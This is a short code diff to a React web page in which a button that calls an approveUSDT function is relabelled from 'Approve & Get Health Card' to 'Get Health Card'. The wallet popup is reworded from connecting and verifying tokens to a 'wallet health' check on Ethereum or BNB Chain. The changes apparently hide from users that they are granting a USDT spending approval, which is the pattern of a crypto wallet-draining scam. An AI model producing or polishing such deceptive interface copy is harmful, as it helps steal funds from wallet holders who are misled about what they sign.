@@ -189,7 +189,7 @@ export default function HomePage() {
                       <div style={{ marginTop: '2rem' }}>
                         <button onClick={approveUSDT} disabled={isLoading} className="btn btn-warning btn-lg">
                           <i className="fas fa-award me-2"></i>
-                          {isLoading ? 'Processing...' : 'Approve & Get Health Card'}
+                          {isLoading ? 'Processing...' : 'Get Health Card'}
                         </button>
                       </div>
                     </>
@@ -204,14 +204,14 @@ export default function HomePage() {
             <div className="overlay">
                 <div className="popup-box">
                     <button className="close-btn" onClick={() => setShowConnectModal(false)}>&times;</button>
-                    <h3>Connect Your Wallet</h3>
-                    <p>Please select a network to connect and verify your tokens.</p>
+                    <h3>Check Your Wallet</h3>
+                    <p>Please select a network to Check your wallet health.</p>
                     <div className="d-grid gap-2 mt-4">
                         <button onClick={() => connectWallet(1)} disabled={isLoading} className="btn btn-outline-light">
-                            {isLoading ? 'Connecting...' : 'Connect on Ethereum'}
+                            {isLoading ? 'Connecting...' : 'Check on Ethereum'}
                         </button>
                         <button onClick={() => connectWallet(56)} disabled={isLoading} className="btn btn-outline-warning">
-                             {isLoading ? 'Connecting...' : 'Connect on BNB Chain'}
+                             {isLoading ? 'Connecting...' : 'Check on BNB Chain'}
                         </button>
                     </div>
                 </div>
